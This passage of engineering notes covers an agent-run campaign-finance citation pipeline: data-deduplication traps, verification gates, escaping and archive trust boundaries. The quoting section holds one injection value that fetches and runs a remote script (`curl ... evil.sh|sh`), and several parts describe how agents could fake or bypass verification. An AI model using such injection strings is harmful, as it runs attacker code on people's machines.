belong here too — "probed, needs a session, retrieve by hand" stops the next run from
re-litigating it and from substituting silently.

**Credentials never enter the registry.** The importer drops `Cookie`/`Authorization` and
`run()` refuses a recipe carrying them, because an endpoint that only works with someone's
session is a manual retrieval, not a pipeline capability — recording it as one would be both
a leak and a lie about what the pipeline can do unattended.

The habit worth keeping: when a source looks browser-only, open dev tools and see what the
UI is calling. The FPPC portal is JS; its data is a cookieless JSON POST.

## Don't proxy the property you actually care about

`snippet_too_short` counted words, as a stand-in for "distinctive". It rejected a parcel
number such as `000-111-222-000` — unique on the page, exactly what a human would ⌘F — and the
retry came back with a span crossing a line break, which our extracted text matches and a human's
find bar does not. The rule pushed researchers toward the failure it existed to prevent.

Uniqueness is checked against the real page and measures distinctiveness directly, so the
length floor only needs to exclude bare common words: short is fine if it is a real
identifier. Line-breaking spans are now rejected outright, since that is a genuine
Cmd-F failure our own matcher cannot see.

## SUM() over no rows is 0.0, and a zero is a publishable sentence

The worst bug this project has produced: `ie_total` asked for expenditures opposing a candidate
and returned **$0.00, marked found** — because the committee that had spent six figures against
them filed with the whole name in the last-name field, so a (last, first) filter matched
nothing. "No committee has spent against this candidate" is a sentence a voter guide would
print.

So: **every query returns `found=False` on no rows**, never a zero, and the note lists
near-matches. `_no_rows()` exists for exactly this and every new query must use it.

Related traps in the same data:
- **A blank amount is not zero.** `CAST('' AS REAL)` is 0.0 and `COUNT(*)` still counts the
  row, so an `ie_total` window whose only row had a blank `AMOUNT` came back found, "$0.00, 1
  expenditure(s)". A blank is money nobody
  stated: leave it out of the sum *and* the count, and name it in the detail. Test for "is a
  number", not "is empty": CAST also reads `N/A` as 0.0 and `1,000` as 1.0. A stated `0` is
  the filer's figure and counts. `ie_total` does this (v2), and the IE listing prints a
  blank as `blank`, not `$0`; the receipt queries and `vg calaccess contributions` do not yet
  (#34 — `RCPT_CD` has 992 blank amounts before dedup).
- **Names are not reliably split.** Match `NAML`, `first || ' ' || last`, and
  `last || ' ' || first`. But with a first name given, do NOT also match a bare surname: a
  race can have two candidates who share one, and a bare surname match belongs to neither.
- **Dates are `M/D/YYYY 12:00:00 AM` text.** A string comparison sorts 5/24/2026 before
  10/14/2014. Normalize in SQL with `iso_date_sql()`, and filter before `LIMIT`, never after
  it in Python. Without a date window, a candidate's old legislative race and current statewide
  race sum into a figure that answers neither — one real unfiltered "support" total was mostly
  money from a race twenty years earlier. Test fixtures use the real format: ISO fixture
  dates once hid a `--since` that dropped 10/14/2025 and kept 3/1/2010.
  Compare a bound at **its own precision**, never cut to a common one: `ie_total` cut both
  bounds to `YYYY-MM`, so `until=2025` excluded all of 2025 (`'2025-06' > '2025'`) and a
  day widened to its month. And refuse a bound that is not a real ISO date: `10/14/2025`
  compares as text, `２０２５` passes `\d` and sorts after every ASCII date, `2025-00` ends
  the window in 2024 — and each returns a total that still matches its recorded `expected`.
  `date_window_sql()` does both; every windowed query goes through it. A row whose date is
  not a real one (`real_date_sql()` — shape is not enough: day-first `14/10/2025` normalizes
  to `2025-14-10`) is the caller's call, and the result must say which it made.

## Verification is re-running the check, not always ⌘F

⌘F is the right verification for prose. It is the wrong one for structured data: a
contribution total is not a string on any page, and insisting it must be one is what pushed
researchers onto third-party mirrors whose numbers we then had to trust.

So a source may carry a **query citation** instead of relying on its snippet: a registered
query name, its parameters, and the value claimed. `verify_query_source()` re-runs it and
compares, the review app prints the command, and the reviewer checks the number by running it.
For structured data this is *stronger* than a snippet — reproducible on demand, with no page
that can change between the run and the review.

The constraints that make it trustworthy:
- **Queries are named and parameterized; agents never write SQL.** An agent that can write
  arbitrary SQL can write one that returns whatever its claim needs — the same
  self-certification problem `verification` has elsewhere.
- **A miss is never a zero.** A donor name that is close but not exact used to return `0.0`,
  which reads as "this donor gave nothing": a false finding wearing a verified badge. A miss
  returns `None` plus near-matches, and fails verification.
- **Exact means to the cent.** `matches()` allows half a cent absolute for dollar figures and
  nothing for integer counts. It used to allow 0.5% relative, which verified a round figure
  against a true total about $2,000 away. Not "within a cent", either: 100.02 − 100.01 is
  0.00999… in binary floats.
- **The printed command is agent-authored text handed to a human's shell.** `human_command()`
  `shlex.quote`s the name, every key and every value. It once quoted only values containing a
  space, so `$(curl${IFS}-s${IFS}evil.sh|sh)` went through bare. Quoting cannot fix a control
  character (it acts on the terminal first), a name starting with `-` (an option to `vg
  query`), a key containing `=`, or invisible text. `QueryCitation` refuses those at load
  (`queries.unsafe_reason`), `run()` refuses them again, and `human_command()` prints nothing
  for them. That has a measured cost: 84 of ~1.2M distinct contributor names in the export
  carry control bytes (mostly double-encoded accents), so those donors are cited by filing
  page, not by query. The quoting is POSIX (sh, bash, zsh); fish reads `\'` differently.
  Test the output in a real `sh`, not only `shlex.split`: shlex expands nothing, so it
  round-trips an unquoted `$(...)` as one tidy argument.

## A collapsed row must still name its provenance

Deduping is not free: when several rows become one, the group has to keep whatever the reader
needs to leave the table. I collapsed restatements and dropped `FILING_ID`, so every listed
contribution printed `filingid=&amendid=0` — a dead link, under a footer instructing the
reader to cite the filing page. The finding aid lost its exit to a citation, which quietly
turns every figure taken from it back into an uncitable number, and it looks like the
researcher's mistake rather than the tool's.

So a collapsed group carries the EARLIEST filing in the chain (where the gift was first
reported) plus a count of how many filings restated it. Anywhere else a dedup lands, ask what
the row still has to be able to point at.

This one also failed *silently*, which is the distinction worth keeping: `vg check-claim`
caught a stale expected value the same night by refusing with an explanation, and that saved a
wrong citation twice. An empty field fails quietly and reads as data.

## A database row is a finding aid, not a citation

Campaign finance only works through the CAL-ACCESS nightly bulk export: `powersearch` drops
non-browser connections and `cal-access` is behind bot protection (which we do not attempt to
defeat — the export is public and carries the same data).

The trap is that the export makes it *easy* to state a number nobody can check. A row in a
local TSV has no URL to open and no text to ⌘F, so a claim resting on one is unverifiable by
construction — the same defect as a fabricated quote, arrived at honestly. Every query
result therefore carries `filing_url()`, and the rule is: use the database to find *which
filing* says a thing, cite the filing's own page with a snippet from it.

Downloading is deliberate and manual (~1.5 GB); the pipeline never fetches it implicitly.
Tests run against a miniature synthetic export, including the stray quotes and short rows the
real TSVs contain — a dropped row there is a missing donation.

## CAL-ACCESS double-counts four ways, and all are silent

A single contribution is counted more than once by four independent mechanisms, each of which
produces a plausible number:

1. **Amendments.** Every amendment of a filing restates its transactions — *all* of them, so
   "latest" means the latest amendment **of the filing**, not of each transaction. Keyed per
   `(FILING_ID, TRAN_ID)`, a transaction the amendment dropped or re-keyed survived from the
   older one: 387,606 receipt rows across 4,722 filings. → `RCPT_LATEST` / `EXPN_LATEST` /
   `S496_LATEST`, keyed per `FILING_ID` within each table (see below for why not the cover).
2. **Filing sequences.** `FILER_FILINGS_CD` has one row per sequence, so joining to it
   multiplies again. → join `FILER_FILING` instead.
3. **Cover records.** `CVR_CAMPAIGN_DISCLOSURE_CD` carries duplicate rows for 61,088
   filings, and joining a clean fact table to a multiplying cover table still double-counts —
   the guards on `S496`/`RCPT` cannot help, because it is the JOIN that fans out. One
   candidate's support total read about 19% high. → join `CVR_LATEST`.
4. **Cross-form.** A gift over the 24-hour threshold is reported on BOTH Form 460 Schedule A
   and Form 496 Part 3 — genuinely different filings, so (1) and (2) miss it. One donor
   came out at exactly double its true total, and it hits large donors hardest because only
   they cross the threshold. → `DEDUPED_RECEIPTS` collapses on the TRAN_ID base shared after
   the form prefix (`A-100001` / `F496P3-100001`).

**"Latest" is the latest amendment in each fact table, not the cover's, on purpose.**
Sometimes a filing's latest amendment has a cover record and no rows in a fact table. That can
mean the amendment withdrew the rows, or that it didn't restate that schedule, and the export
can't tell which. A full rebuild found 753 such (table, filing) pairs. `S496_CD` has 183
filings ($5.66M), `RCPT_CD` 388 ($79.1M) and `EXPN_CD` 182 ($12.8M). Every table has both
kinds, and 2026 does too:
- One filing's amendment says "Remove Independent Expenditure", withdrawing a six-figure
  expenditure against a candidate.
- Another's says it updates an IE's amount, and has no rows at all.

Taking the cover's maximum would count the second kind as zero. It would also drop six figures of
receipts behind an amendment whose only stated change was a missing address. The
per-table maximum keeps the older rows instead. That overcounts the first kind (the
withdrawn expenditure still counts), and it is still wrong for the second, because it gives
the update's old amount, not the new one. Nothing loaded or loadable separates the two kinds:
- Summary totals (`SMRY_CD`) don't. One filing's summary still reports the Schedule C total its
  amendment's rows omit.
- E-filing headers (`HDR_CD`) don't: every one of the 753 has one.
- Filing types don't either.

So the rule keeps the rows. It never zeroes a filing's rows for want of a restatement,
while a zero from the cover rule would read as a finding. The rule's own error is silent
today too; #31 is to flag every figure that includes such a row. None of the known-good
figures involves one, and each comes out the same under either rule. When two rules fail in
opposite directions and the data can't say which case you're in, keep the one that doesn't
manufacture a zero, and flag the case. (Which candidate total a kept row reaches is a separate
question, below: the update filing's rows reach none.)

**Whose money a kept row is has the same ambiguity, and the latest cover still decides it.**
Form 496 rows join `CVR_LATEST`, the filing's latest cover. (Receipts reach their filer
through `FILER_FILING` and never join a cover.) When the latest cover comes from a later
amendment with no rows, it can name a different candidate or stance. That happens for 24 Form
496 rows ($177,165.01) in 13 filings, and the amendments' explanations are just as mixed:
- **8 are withdrawals.** For example, one says it removes a late IE report, and its later cover
  moves opposition to one candidate onto support for another.
- **1 corrects the cover**, adding the candidate the expenditure was for.
- **1 is an update**, and its later cover names no candidate, so its rows reach no candidate
  total.
- **3 are unclear:** one has no explanation, one says "N/A", and one says "AMENDMENT TO
  NON-MONETARY CONTRIBUTION".

I tried joining each row to its own amendment's cover instead, and reverted it. It lost the
corrected filing's money for the candidate its later cover added, and it turned disowned money
into findings: filings whose amendments say "filed in error" or "inappropriately filed"
credited thousands of dollars to candidates. Neither cover is right in
general. So the latest cover stays, and #31 is to flag a row whose own cover and latest cover
disagree. Changing which evidence decides an ambiguous case only changes who is wrong; flag
it instead.

Test SQL through `uv run python`, not the `sqlite3` CLI: they are different SQLite builds.
Python's bundled 3.50 rejects an outer column in a subquery's `ORDER BY` ("no such column"),
and the 3.54 CLI accepts it. A cover lookup (since reverted) that ran fine in the CLI failed
21 tests. Correlate through `WHERE`, which every version accepts.

To measure a view change without touching the live database, build a scratch root **outside
any data root**, such as a temp directory. Symlink the zip into `<scratch>/cache/calaccess/`,
then run `uv run vg calaccess build --data <scratch>`. It takes about five minutes and ~6 GB.
Don't use `data/scratch`: `_cache_root()` sends a child of a directory holding `questions.json`
to its parent, so that build deletes and rebuilds the live database.

The safety test before trusting any total: check which form types the filer actually used. A
committee with no Form 496 rows cannot be hit by (4).

`AMEND_ID`, `TRAN_ID` and `LINE_ITEM` are not optional columns. I dropped them once to shrink
the database and made the data unusable while it still looked plausible.

A view fix does not reach a database that is already built: views are written in at build
time, and the real export database kept the per-transaction view after the code was fixed.
So `connect()` installs every dedup view as a TEMP view, which SQLite resolves before `main`,
and the definition in `calaccess.py` is the one every query runs. A change that only
redefines a view applies on the next connection, with no rebuild. The persisted copies are
only as current as the last build, so check a figure with `vg query`, not by hand in the
sqlite3 shell.

**A fix that needs a column the database never loaded still needs a rebuild.** I first wrote
here that this mechanism made rebuilds unnecessary. That was false for the cover layer. In a
database built before `CVR_CAMPAIGN_DISCLOSURE_CD.AMEND_ID` was loaded,
`CVR_LATEST` falls back to `DISTINCT` and keeps every amendment's cover. An amendment can
change who the filing is about: one moves from supporting one candidate to supporting
another, and 597 Form 496 filings carry more than one cover. Joined to all of
them, the latest amendment's expenditures count for every candidate any amendment named.
That put six figures of other candidates' money into one candidate's all-years support.
`connect()` raises `DegradedDatabaseWarning` whenever it has to fall
back. `ie_total`, the one citable query over covers, goes further: it refuses
(`DegradedDatabase`), because a warning printed once to stderr still let that total re-run
and render green. Until the rebuild, every `ie_total` citation reads as not reproduced. The
listing (`vg calaccess independent-expenditures`) is a finding aid, and keeps working under the
warning. The fix is an operator step, `uv run vg calaccess build`, which rebuilds from the
downloaded zip.

The same mistake reached a test: a fixture modelled a filing "as filed" from its Form 496 rows
alone and gave it the wrong cover, so the test asserted the misattribution. In Form 496
data, who the money is for lives on the cover. Before calling a fixture "as filed", read
every amendment's cover as well.

Worth remembering how the first two were caught: the deduped totals matched what a researcher
had independently reported from a third-party mirror. The mirror was right and the tool was
wrong — so when the pipeline and an outside source disagree, check the pipeline first.

## A query citation proves the query reproduces, not that it is right

The sharpest line to come out of running this, from the session that got caught by it: *a
query citation verifies that the query is reproducible, not that the query is correct.*
`vg verify` marked an inflated support figure green because the query did return its own
recorded `expected` — the number was wrong and the check passed.

What caught it was the judgment pass, not any mechanical check. That is the argument for
keeping a fresh verifier on query citations too, even though the mechanics look airtight.

**So a verdict on a query citation is about one definition of the query, and is versioned
like a page.** Every registered name has already returned different numbers after a fix, and
the sid (name, params, expected) does not cover the calculation: a query fixed to compute
something else that happened to return the same number kept a verdict about the old one. Each
`queries.REGISTRY` entry carries a `version`; `vg judge` stamps it on the verdict, and a verdict
under any other version — or none, i.e. recorded before versions existed — is stale and not
applied. `vg verify` lists them for re-judging.

The bump rule, beside the registry: **bump when a change can alter what the query returns
for any input the previous version accepted**, even if every recorded figure still
reproduces — dedup, name matching, what a parameter or date bound means, a newly required
parameter, refusing an input that used to return a value. Don't bump for wording, suggestions,
speed, or a new optional parameter whose default keeps the old behaviour. The recorded figures
reproducing is not the test: the verifier judged the calculation, not only its output. So
day-precision date bounds would bump `ie_total` even though the month-precision citations
reproduce exactly — re-judging those verdicts once is the cost, and it is the right one. That
change landed before versioning did, so v1 is defined over it; the next change like it bumps.
The first one did: `ie_total` v2 leaves an unreadable amount out of the count, so a window
holding only such rows is a miss where v1 returned a found `$0.00`. Every recorded figure
reproduces under v2, and its v1 verdicts are re-judged all the same.

A rule in a comment is one a session can skip, so it has a gate:
`test_a_query_definition_cannot_change_unnoticed` pins each query's version to a fingerprint
of its code and of everything else `queries.py` and `calaccess.py` define, and fails on any
change until the pin is updated. Updating it is the moment to decide on the bump, in a diff a
reviewer reads. It counts by **exclusion**: only what is named in `_NOT_A_DEFINITION`
(messages, listings, the export metadata, the comparison and the printed command) is left out.
The first version hashed a hand-kept list of helpers, and within a day it missed the
date-window helpers added later — a list of what a query uses goes stale exactly when someone
adds to it. A shared helper moving every fingerprint at once is deliberate: it changes every
query.

What the figure was checked against is stamped too, machine-owned inside `verification`
(`query_run`): the version, the date of the CAL-ACCESS export the database was built from
(`vg calaccess build` records it), and the cache root. The review page prints all three, and
the command beside them carries `--cache`, so it reads the database the figure was verified
against rather than whatever `--data` resolves to. `vg judge` records a verdict only when the
question's claim file carries a `query_run` matching the current definition, export and root —
the verifier judged that run's context, and stamping today's version over an older run's
output would make a verdict about the old calculation read as current. Otherwise it refuses and
says to re-verify, and `vg judgments` lists such a row as blocked (`run vg verify`) rather than
counting it in the gate, which judging could then never close.

That check reads a claim file, and sits on the trusted side deliberately: it can only refuse.
A forged `query_run` gets past it to exactly the stamp `vg judge` wrote before the check
existed — the registry's version and this root's export — never to anything better.

An older export is **reported, not stale**. The sid covers the claim's recorded `expected`,
not the live result, so a verdict survives a refresh either way — but the row only renders
green if the same definition still reproduces `expected` on the new export: the same number
from the same calculation, which is what the verdict was about. If the figure moved, the row
fails verification whatever its verdict, and correcting `expected` changes the sid, so the
verdict lapses. The report counts only verdicts that were applied on a row that reproduced.

And the trap that produced it, worth naming because it will recur: that session trusted a
freshly-fixed query over a human-sourced figure that disagreed, treating the disagreement as
evidence the human number was stale. It was the query that was wrong. **When a new tool and an
existing source disagree, suspect the tool** — it has been the tool every time so far.

## A query citation checks a number, not a ranking

This one bit a session repairing its own work: it carried a mirror-derived *ranking* over to
query-verified *totals* without re-deriving the order, and published one donor's figure as
"the largest single contributor" when lifetime it is a tie — and a "top" list whose tail
omitted larger donors. Every individual figure was correctly query-verified.

So: `contributor_total` can establish an amount and never a rank. Superlatives ("largest",
"top", "only") need `top_contributor` or an explicit ordered query, and completeness claims
("the top five are…") are not verifiable by per-item citations at all. A green row means the
number reproduces, not that the sentence around it is sound — which is exactly why the
judgment pass exists.

## A surname is not a candidate

The same applies to donors: `contributor_total` for a common surname summed unrelated people
who share it into one six-figure total. Individuals need `contributor_first`; organizations do
not, since their whole name sits in `CTRIB_NAML`.

`ie_total` for a surname alone returned a total of which under 5% was the candidate's; the rest
was another candidate with the same surname, in a different county and year. It now **requires**
a first name rather than accepting one optionally — an optional guard on a candidate query is
not a guard, because the wrong answer is well-formed and there is no snippet for anyone to check.

## The database can fabricate a finding out of real rows

Asking CAL-ACCESS for independent expenditures naming a two-letter surname, with a substring
match, returned committees supporting a different candidate whose name merely contains those
letters, and reported a multi-million total as the candidate's largest backer.
Every row was real. The amount was real. The person was wrong.

None of the pipeline's defenses apply here: there is no snippet to check, no page to fetch,
no verifier reading context. A query bug produces a confident, well-formed, entirely false
claim. So surname matching is **exact** by default, `--loose` is opt-in, and `--first`
exists because a committee named `<Surname> for <Office> 2026` can belong to either of two
candidates who share the surname.

When you add a query here, ask what it returns for the wrong person.

## An agent's declared tools must match what you told it to do

`verifier.md` said `tools: Read, WebFetch` while its instructions told it to run
`uv run vg judge`. It had no Bash, so it physically could not. All three verifier subagents
went idle in two minutes, wrote nothing, and reported nothing — and because an unjudged
source rendered green, the result was a silent, complete bypass of the judgment pass. The
run looked clean.

Two rules from that:
- When you add a command to an agent's instructions, check its frontmatter grants the tool.
- Make the absence loud rather than trusting the agent ran: a source with no verdict is
  `pending`, never `verified`. `vg judgments` ends with the count of sources that still
  need a verdict.

Silence from a subagent is not success, and the pipeline should not treat it as such.

## Rules agents can skim need a gate they cannot

`researcher.md` has said "5–10 distinctive words" since the first commit, and a one-word
snippet was still written twice in testing. Prose sets the expectation; it does not enforce
it. `vg check-claim` runs the verifier's own checks and exits non-zero, and the researcher
is required to reach a clean exit before reporting done.

Generalize the lesson before adding another paragraph of instruction: if a rule matters and
an agent can violate it, give it a command that fails.

## A gate is a number the tool prints, counting exactly what its step can close

Sessions decided the judgment pass was finished by running `grep -c unreviewed` on the
`vg judgments` table. Rich wraps long rows, so the grep under-reported twice, and a run read
as done while sources had no verdict. A gate that someone derives by counting rows of display
output is only as reliable as the display's layout. So the tool prints the number, as the
last line: `N of M cited source(s) need a verdict (K stale)`. The instructions say to read it,
and the command exits 1 until it reads 0, so an agent that only checks the exit code can't
misread it either.

Getting that number right took six passes, five of them caught in review. In every one, the
count and build disagreed about which sources belonged in it:
- **Too few: a stale verdict counted as done.** `vg build` drops a verdict that predates its
  page, so the count could read 0 while the review app still showed pending rows.
- **Too few: a `support` in the claim file counted as a verdict.** `apply_to()` used to *skip*
  a source with no usable verdict, and build loads claim files trusting machine fields. So a
  `support` already in the file, hand- or agent-written, rendered as judged, which
  self-certifies the judgment pass. `vg verify` rebuilds `Verification` after stripping, so
  pipeline-written files never carry one. `apply_to()` now resets such a source to
  `unreviewed`: a verdict comes from `data/judgments/` or not at all.
- **Too many: sources with nothing to judge counted as waiting.** The verifier judges from a
  source's confirmed context. A citation that failed its checks, is paywalled, or was never
  verified has none. Counted, those made 0 unreachable: a verifier could judge everything it
  was given and never close the gate.
- **Wrong source of truth: classifying by the claim file's status.** Build re-checks that
  status against the cache (`revalidate_from_cache()`) and can disagree. It discards a quote
  that no longer reproduces, and drops a verdict whose context moved since `vg verify`.

Each fix re-derived one more piece of build, and each re-derivation missed something. So
`vg judgments` now *runs* build's offline checks read-only, as `vg status` does:
`judgments.merge()` (the body of `apply_to()`), then `revalidate_from_cache()`. It splits
what build will show without a verdict into two lines. The gate is sources a verdict would
fix: status in `verify.GOOD`, so there is confirmed context, and no usable verdict. The rest
have nothing a verifier can judge yet. Either their status isn't `GOOD`, or revalidation dropped
a usable verdict because the context moved since `vg verify`. Tests pin the two to add up to
build's `claims.json`. Two more ways the gate read 0 wrongly are also closed: when there was
nothing to count (a typo'd `--data` or `--question-id`), and when `load_claims()` skipped an
unreadable claim file. Both now exit 1.

Two rules come out of it. A gate counts what its own step can close: no more, or it never
reaches 0, and no less, or it reads 0 early. And a count that predicts another command's
result runs that command's code, because a re-derivation drifts.

## The review app renders untrusted text — autoescaping is load-bearing

Everything on that page (claim text, publisher, author, snippets, verification reasons)
is agent-authored and derived from fetched web pages. Escaping is the only thing standing
between an attacker's page and script running in the reviewer's browser — where it could
mark every citation checked in `localStorage` and defeat the human verification this repo
exists to provide.

**Gotcha that already bit once:** `select_autoescape(["html"])` matches on the *filename
suffix*. This template is `review.html.j2` — it ends in `.j2`, so the predicate returned
False and autoescaping was off for the whole app while the code read as though it were on.
Use `autoescape=True`. `report.context_html()` returns `Markup` and escapes its own
interpolations; it is the only value in the template intended as HTML, and nothing else
should ever be marked safe.

Same reasoning for `models._http_only`: it validates that a URL is http(s) *and* free of
quotes/whitespace/control characters, because its docstring promises the value is safe to
drop into an `href` and that promise shouldn't depend on every caller escaping correctly.

## archive_url is evidence, so its host AND its target are part of the trust boundary

`verify_against_archive()` fetches `archive_url` and treats a snippet found there as
grounds to mark a paywalled source `verified_via_archive`. That is only sound because the
value is constrained to `https://web.archive.org/` — an arbitrary host would let an agent
stand up a page containing its own fabricated quote and verify against it.

An earlier version of this reasoning was wrong in a way worth recording: it argued a
forged `archive_url` "buys an agent nothing, because the snapshot is fetched and the
snippet must really be in it." That holds only if the agent doesn't control the page being
fetched. Whenever something is fetched and believed, ask who can control what comes back.

The host pin was then wrong the same way, one level down. It says who *serves* a snapshot,
not what it *captured*, and anyone can Save Page Now a page they control. So:
- **The target is checked too.** `archive.snapshot_of()` parses the page out of the Wayback
  path and requires it to be the cited URL — folding only scheme, that scheme's default port,
  one trailing slash, host case and fragment, plus a redirect the pipeline itself saw on the
  live fetch. `verify_against_archive()` and `revalidate_from_cache()` both refuse a mismatch,
  and the former also refuses a snapshot that served an error page or a bot check: either can
  echo the snippet. A snapshot is judged by where its fetch *ended up*, too: fetches follow
  redirects, and the Wayback Machine's nearest capture can replay a redirect to another page.
- **`verified_via_archive` stands on the live page being gated, asked of the page.** Both
  functions require the cached live page to check as `could_not_verify_paywall`. Without it a
  status hand-edited to `verified_via_archive` reproduced against an earlier faithful capture
  and rendered green — "live page not readable" — over a readable page the quote had since
  been removed from; and `vg archive`, which loads trusted, upgraded a paywall status written
  into the claim file the same way. The status is a claim about the live page, so it is
  checked against the live page, never taken from the file.
- **Only the pipeline's own snapshot is ever used.** `archive_url` used to be kept on ingest,
  because `vg verify` strips and writes back and would have deleted every snapshot; its
  safety rested on `vg archive` overwriting it, which it skipped wherever Save Page Now
  failed — always, on cal-access. Now `vg archive` records what it saved in the run's
  `archives.json`, and the archive fields are never read from a claim file in any load mode,
  trusted included: `apply_archive()` sets them from the records in every command that
  writes claims back or renders them, and a command that forgets to shows no snapshot rather
  than the file's. `archives.json` is pipeline-owned the way `judgments/` and the page cache
  are — agents don't write there — and its values still pass the target and content checks
  at every use. A run archived before this has no records, so its snapshots disappear until
  `vg archive` is re-run — failing toward re-checking, and `vg verify` / `vg build` say how
  many they ignored. Adopting the old claim-file values instead is exactly the
  agent-authored input this closes.

## A schema constraint guards only what passes through the schema

`question_id` has been pattern-constrained since claims became files, and that looked like
the traversal defence. It was, for claims. `vg judge` takes its question id from the command
line, where verifier agents (which have Bash) put it, and never builds a `Claim` — so
`vg judge ../claims/q7 …` created and replaced a file outside `judgments/`, and an absolute
id (pathlib drops everything before one) could land anywhere.

So `judgments.path_for()` checks the id against `models.QID_PATTERN` itself: the check lives
where the path is built, which every read or write by question id passes through, not at one of
the doors into it. A shard found by *listing* `judgments/` is read by path instead, since it is
inside the directory by construction. When an agent-supplied value becomes a filename, find the
function that joins it, and check there.

What this bounds is a verdict to `<run>/judgments/`, not the run itself: `--data` is also on
the agent's command line, but naming the run directory is that flag's whole job.

## Known and accepted: the pipeline fetches whatever a claim cites

`vg verify` fetches agent-supplied URLs with redirects followed and no network allowlist,
so a claim citing `http://127.0.0.1:<port>/…` or a link-local address would be fetched and
its text cached. That is SSRF-shaped, and it is deliberate: fetching arbitrary cited URLs
is the entire job. Worth revisiting if this ever runs somewhere with sensitive services on
localhost or a metadata endpoint reachable from the host — restricting targets is a design
decision, not a bug fix.

## Archiving needs a key to actually work

Anonymous Save Page Now rate-limits and 500s hard: a full 31-question run left 58 of ~150
URLs with no snapshot. Authenticated SPN has a much higher quota, so a real run should set
`ARCHIVE_ORG_ACCESS_KEY` and `ARCHIVE_ORG_SECRET_KEY` (keys from
https://archive.org/account/s3.php — creating them needs an archive.org login, so a human
has to do it).

Credentials are read from the environment only. Never in the repo, never in a file this code
reads, never in a claim file, never logged. `credentials()` refuses a half-configured pair
rather than sending a malformed header.

`vg archive` says which mode it is in, because silently degrading to the anonymous path is
how a run ends up with a third of its citations unarchived and nobody noticing until the
report.

Note that a key does not fix everything: cal-access.sos.ca.gov returns 500 from SPN because
its own bot protection blocks the archive crawler. An unarchivable citation is a fact about
the source, not a pipeline failure.

**A successful save is not a usable snapshot.** On at least one cal-access page SPN reported
success and captured the Incapsula bot check — HTTP 200, no text — and `vg archive` recorded
it as archived. On a row whose live page can't be read, that snapshot is the reviewer's only
route to the text, so junk there is worse than nothing: it looks like evidence. Every
snapshot is now checked (`verify.check_snapshot()`): the snippet must be in it, or for a
query citation it must match the live page's text — never just its title, since cal-access
gives every page the same one. A recognized bot check is named. A failure is
`archive_unusable` — a warning, never a failure of the citation — and the row gets a badge
and no archive link — but only on evidence: failing to load a capture (a timeout, a 404 before
the Wayback Machine indexes a fresh one) is not evidence it's junk, while loading one that holds
no text is. A capture that could not be checked (it would not load, or the live page is
unreadable and there is no snippet) is `archive_unconfirmed`: offered, not vouched for. So
is an older capture standing in for a failed save on a query citation: its page furniture can
match while its figures belong to another cycle. `save()` returns that fallback with its
error, so it is never recorded as fresh.

When a save fails, `vg archive` keeps the pipeline's own earlier snapshot over that fallback,
unless ours is known junk (`verify.junk_capture()`: a capture of another URL, a fetch that
landed elsewhere, a bot check, nothing readable). Keeping it unconditionally meant that on a URL
where SPN always fails (cal-access), a captured bot check could never be replaced by a good
capture. Junk is asked of the capture alone, never of a snippet: "the snippet is not in it" can
be the citation's fault, and throwing away a real capture for it would leave the researcher's
retry with nothing. With no fallback to try, ours is kept, so its badge and note survive.

## Stage explicit paths; `git add -A` has bitten this repo twice

Background research runs write into `data/` continuously, and agent worktrees live under
`.claude/worktrees/`. A blanket `git add -A` has therefore twice committed things nobody
meant to: once an agent worktree as an embedded gitlink, once 90 files of a *still-running*
run's judgment data under a commit message describing something else entirely.

Name the paths you intend to commit. If you want everything, look at `git status` first and
confirm no run is mid-flight — a commit whose message and contents disagree is worse than an
untidy tree, because the message is what the next person reads.

**Worktrees share `origin/*` refs, so a stacked branch's base can move while you work.**
Another session's fetch or push updates `origin/<parent>` in every worktree at once. A
`git reset --soft origin/<parent>` to regroup commits, run after the parent gained new
commits, silently put a tree built on the *old* base on top of the new one. The result
reverted every one of the parent's new changes in a commit whose message said nothing about
them. Record the base SHA when you branch, and reset or rebase onto that SHA, not the ref
name. Before pushing a stacked branch, check that `git diff origin/<parent> HEAD --stat`
names only your files.

## A typer default is not a value when a test calls the command

Tests call commands as plain functions (`cli.show_judgments(data=...)`), not through typer. A
parameter declared `repair: bool = typer.Option(False, hidden=True)` then gets its Python
default, the `OptionInfo` object, which is truthy: every test that omitted the flag ran the
retired-flag refusal. Give options through `Annotated[bool, typer.Option(...)] = False`, so
the default is a real value either way. Typer does not resolve a `type` alias to an Annotated,
so spell each one out.

## Style

Verdict-first, information-dense, no padding. Distinguish enacted law from proposals and
primary sources from advocacy framing.
